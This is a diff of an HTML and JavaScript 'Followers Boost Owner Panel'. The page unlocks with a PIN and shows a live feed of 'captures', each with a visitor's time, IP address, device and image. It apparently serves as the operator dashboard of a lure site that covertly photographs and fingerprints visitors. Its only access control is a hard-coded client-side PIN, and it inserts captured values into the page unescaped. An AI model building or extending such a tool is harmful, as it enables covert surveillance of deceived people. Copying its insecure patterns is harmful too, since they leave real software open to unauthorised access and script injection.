@@ -13,7 +13,7 @@
       border: 1px solid rgba(255, 255, 255, 0.15);
     }
 
-    /* Neon glow title */
+    /* Neon glow text */
     .neon-text {
       background: linear-gradient(90deg, #00f5ff, #7b2ff7, #ff00d4);
       -webkit-background-clip: text;
@@ -34,25 +34,45 @@
       }
     }
 
-    .fade-in {
-      animation: fadeIn 1s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+    .fade-in { animation: fadeIn 1s ease-in-out; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px);} to { opacity: 1; transform: translateY(0);} }
 
     /* Blink highlight for new logs */
-    .highlight {
-      animation: blink 1.2s ease-in-out 2;
-    }
+    .highlight { animation: blink 1.2s ease-in-out 2; }
     @keyframes blink {
       0%, 100% { box-shadow: 0 0 10px rgba(0, 245, 255, 0.4); }
       50% { box-shadow: 0 0 20px rgba(255, 0, 212, 0.7); }
     }
+
+    /* Fancy buttons */
+    .btn-glow {
+      background: linear-gradient(90deg, #00f5ff, #7b2ff7, #ff00d4);
+      color: #fff;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+    .btn-glow:hover {
+      filter: brightness(1.2);
+      transform: translateY(-2px) scale(1.02);
+      box-shadow: 0 0 20px rgba(123, 47, 247, 0.6), 0 0 40px rgba(0, 245, 255, 0.4);
+    }
+
+    /* Owner card style */
+    .owner-card {
+      background: rgba(0,0,0,0.3);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      padding: 1rem 2rem;
+      border-radius: 1rem;
+      transition: transform 0.3s, box-shadow 0.3s;
+      width: 100%;
+    }
+    .owner-card:hover {
+      transform: translateY(-4px) scale(1.02);
+      box-shadow: 0 0 15px #00f5ff, 0 0 30px #7b2ff7, 0 0 45px #ff00d4;
+    }
   </style>
 </head>
-<body class="bg-gradient-to-br from-gray-900 via-indigo-900 to-black text-white flex flex-col items-center justify-center min-h-screen">
+<body class="bg-gradient-to-br from-gray-900 via-indigo-900 to-black text-white min-h-screen flex flex-col">
 
   <!-- Navbar -->
   <nav class="w-full glass p-4 flex justify-between items-center shadow-lg">
@@ -64,104 +84,135 @@
     </div>
   </nav>
 
+  <!-- Info Section -->
+  <section class="mt-10 mx-auto max-w-3xl text-center fade-in">
+    <h2 class="text-4xl neon-text mb-4">👑 Welcome to the owner panel</h2>
+    <p class="text-gray-300">Authorized personnel only.  
+    All actions are monitored for security.</p>
+  </section>
+
   <!-- Owner PIN Section -->
-  <div id="pinSection" class="mt-12 text-center fade-in glass p-8 rounded-2xl shadow-lg max-w-sm">
+  <div id="pinSection" class="mt-12 text-center fade-in glass p-8 rounded-2xl shadow-lg max-w-sm mx-auto">
     <h2 class="text-2xl font-semibold mb-4">Enter Owner PIN</h2>
-    <input id="ownerPin" type="password" placeholder="PIN" 
+    <input id="ownerPin" type="password" placeholder="PIN"
            class="px-3 py-2 rounded text-black focus:ring-2 focus:ring-cyan-400">
-    <button onclick="checkOwner()" 
-            class="bg-gradient-to-r from-cyan-500 to-purple-600 px-4 py-2 ml-2 rounded hover:opacity-90 transition">Unlock</button>
+    <button onclick="checkOwner()" class="btn-glow px-4 py-2 ml-2 rounded">Unlock</button>
   </div>
 
-  <!-- Logs Section -->
-  <div id="logs" class="hidden mt-10 w-11/12 max-w-2xl fade-in">
-    <!-- Animated Owner Name -->
+  <!-- Logs + Owner Info Section (hidden until PIN is correct) -->
+  <div id="logs" class="hidden mt-10 w-11/12 max-w-4xl mx-auto fade-in flex-1 flex flex-col">
+
+    <!-- Owner Info -->
+    <section id="ownerInfo" class="mb-10 text-center glass p-8 rounded-2xl shadow-lg">
+      <h2 class="text-3xl font-semibold neon-text mb-6">👤 Owner Information</h2>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+        <div class="owner-card">
+          <p><span class="font-semibold text-cyan-400">Name:</span> Unknown</p>
+        </div>
+        <div class="owner-card">
+          <p><span class="font-semibold text-cyan-400">Role:</span> Administration</p>
+        </div>
+        <div class="owner-card">
+          <p><span class="font-semibold text-cyan-400">Status:</span> Online</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Capture Logs -->
     <div class="mb-6 text-center">
-      <h2 class="text-4xl neon-text">👑 Welcome, Owner</h2>
+      <h2 class="text-4xl neon-text">📂 Capture History</h2>
+      <p class="text-gray-400">All recorded logs will appear here in real-time.</p>
     </div>
-    <h3 class="text-xl font-bold mb-4">📂 Capture History</h3>
-    <button onclick="clearLogs()" class="bg-gradient-to-r from-pink-500 to-red-600 px-4 py-2 rounded mb-4 hover:opacity-90 transition">Clear All</button>
-    <div id="logContainer" class="space-y-4"></div>
+    <div class="flex justify-between mb-4">
+      <h3 class="text-xl font-bold">Recent Logs</h3>
+      <button onclick="clearLogs()" class="btn-glow px-4 py-2 rounded">Clear All</button>
+    </div>
+    <div id="logContainer" class="space-y-6"></div>
   </div>
+
+  <!-- Footer -->
+  <footer class="w-full text-center py-4 text-gray-400 text-sm mt-8">
+    ⚡ Powered by <span class="text-cyan-400 font-semibold">Followers Boost Owner Panel</span>
+  </footer>
 
   <!-- Notification Sound -->
   <audio id="notifySound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
-  const OWNER_PIN = "1234"; 
-  const socket = io();
+    const OWNER_PIN = "1234"; 
+    const socket = io();
 
-  function toggleMenu() {
-    document.getElementById("navLinks").classList.toggle("hidden");
-  }
-
-  function checkOwner() {
-    const pin = document.getElementById("ownerPin").value;
-    if (pin === OWNER_PIN) {
-      document.getElementById("pinSection").classList.add("hidden");
-      document.getElementById("logs").classList.remove("hidden");
-      loadLogs();
-
-      socket.on("new-capture", log => {
-        addLog(log, true);
-        playNotification();
-      });
-
-      socket.on("clear-captures", () => {
-        document.getElementById("logContainer").innerHTML = "<p class='text-gray-400'>All captures cleared.</p>";
-      });
-
-    } else {
-      alert("❌ Wrong Owner PIN!");
+    function toggleMenu() {
+      document.getElementById("navLinks").classList.toggle("hidden");
     }
-  }
 
-  function loadLogs() {
-    fetch("/get-captures")
-      .then(res => res.json())
-      .then(logs => {
-        const container = document.getElementById("logContainer");
-        container.innerHTML = "";
+    function checkOwner() {
+      const pin = document.getElementById("ownerPin").value;
+      if (pin === OWNER_PIN) {
+        document.getElementById("pinSection").classList.add("hidden");
+        document.getElementById("logs").classList.remove("hidden");
+        loadLogs();
 
-        if (logs.length === 0) {
-          container.innerHTML = "<p class='text-gray-400'>No captures yet.</p>";
-          return;
-        }
+        socket.on("new-capture", log => {
+          addLog(log, true);
+          playNotification();
+        });
 
-        logs.forEach(log => addLog(log, false));
-      });
-  }
+        socket.on("clear-captures", () => {
+          document.getElementById("logContainer").innerHTML = "<p class='text-gray-400'>All captures cleared.</p>";
+        });
 
-  function addLog(log, prepend = false) {
-    const container = document.getElementById("logContainer");
-    const div = document.createElement("div");
-    div.className = "glass p-4 rounded-xl shadow-lg transition";
-    div.innerHTML = `
-      <p class="mb-1">🕒 <span class="text-gray-300">${log.time}</span></p>
-      <p class="mb-1">🌍 <span class="text-gray-300">${log.ip}</span></p>
-      <p class="mb-2">📱 <span class="text-gray-300">${log.device}</span></p>
-      <img src="${log.img}" width="250" class="mt-2 rounded-lg border border-gray-700 shadow">
-    `;
-    if (prepend) {
-      container.prepend(div);
-      div.classList.add("highlight"); 
-    } else {
-      container.appendChild(div);
+      } else {
+        alert("❌ Wrong Owner PIN!");
+      }
     }
-  }
 
-  function clearLogs() {
-    fetch("/clear-captures", { method: "POST" });
-  }
+    function loadLogs() {
+      fetch("/get-captures")
+        .then(res => res.json())
+        .then(logs => {
+          const container = document.getElementById("logContainer");
+          container.innerHTML = "";
 
-  function playNotification() {
-    const sound = document.getElementById("notifySound");
-    sound.currentTime = 0;
-    sound.play().catch(() => {
-      console.log("🔇 Notification sound blocked until user interacts with the page.");
-    });
-  }
+          if (logs.length === 0) {
+            container.innerHTML = "<p class='text-gray-400'>No captures yet.</p>";
+            return;
+          }
+
+          logs.forEach(log => addLog(log, false));
+        });
+    }
+
+    function addLog(log, prepend = false) {
+      const container = document.getElementById("logContainer");
+      const div = document.createElement("div");
+      div.className = "glass p-4 rounded-xl shadow-lg transition";
+      div.innerHTML = `
+        <p class="mb-1">🕒 <span class="text-gray-300">${log.time}</span></p>
+        <p class="mb-1">🌍 <span class="text-gray-300">${log.ip}</span></p>
+        <p class="mb-2">📱 <span class="text-gray-300">${log.device}</span></p>
+        <img src="${log.img}" width="300" class="mt-2 rounded-lg border border-gray-700 shadow">
+      `;
+      if (prepend) {
+        container.prepend(div);
+        div.classList.add("highlight"); 
+      } else {
+        container.appendChild(div);
+      }
+    }
+
+    function clearLogs() {
+      fetch("/clear-captures", { method: "POST" });
+    }
+
+    function playNotification() {
+      const sound = document.getElementById("notifySound");
+      sound.currentTime = 0;
+      sound.play().catch(() => {
+        console.log("🔇 Notification sound blocked until user interacts with the page.");
+      });
+    }
   </script>
 </body>
 </html>
